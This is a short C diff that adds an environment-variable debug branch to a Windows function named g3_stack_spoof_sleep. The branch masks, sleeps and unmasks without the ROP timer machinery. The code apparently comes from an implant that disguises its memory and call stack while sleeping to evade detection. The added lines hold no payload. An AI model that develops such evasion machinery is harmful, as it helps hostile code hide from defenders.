@@ -612,6 +612,23 @@ __declspec(noinline) static BOOL g3_stack_spoof_sleep(DWORD time, G3_MASKFN mask
 	unsigned char * rsp_at_wait;
 	BOOL ok = FALSE;
 
+	/* TEMP 1a' diag: G3_NOROP=1 serves the window as mask+psleep+unmask
+	 * (no timers/beats) to split the mid-window death between the ROP
+	 * machinery and the mask loop itself (removed with the root fix). */
+	{
+		char v[2] = { 0, 0 };
+		DWORD n = GetEnvironmentVariableA("G3_NOROP", v, 2);
+		if (n > 0 && v[0] == '1') {
+			void (WINAPI *psleep)(DWORD) = (void (WINAPI *)(DWORD))
+				GetProcAddress(GetModuleHandleA("kernel32.dll"), "Sleep");
+			if (psleep == NULL)
+				return FALSE;
+			maskfn(ctx);
+			psleep(time);
+			maskfn(ctx);
+			return TRUE;
+		}
+	}
 	if (time < 700) {
 		/* short window: the fixed 150/300ms beats would land out of order
 		 * against a wake at time+600 - serve it masked with a plain
